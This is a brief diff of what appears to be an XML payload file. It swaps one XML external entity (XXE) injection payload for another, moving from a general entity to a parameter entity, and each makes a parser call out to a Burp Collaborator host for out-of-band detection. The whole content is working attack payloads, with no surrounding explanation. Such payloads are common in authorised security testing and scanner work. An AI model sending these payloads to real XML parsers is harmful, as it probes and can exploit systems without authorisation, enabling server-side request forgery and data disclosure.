@@ -1,2 +1,1 @@
-<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://9oymt1yhk2griyzmdmn9z8pndej47t.burpcollaborator.net"> ]>
-<x>&xxe;</x>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://m1ofb5aoq31gsnjx39vaqoxklbr1fq.burpcollaborator.net"> %xxe; ]>
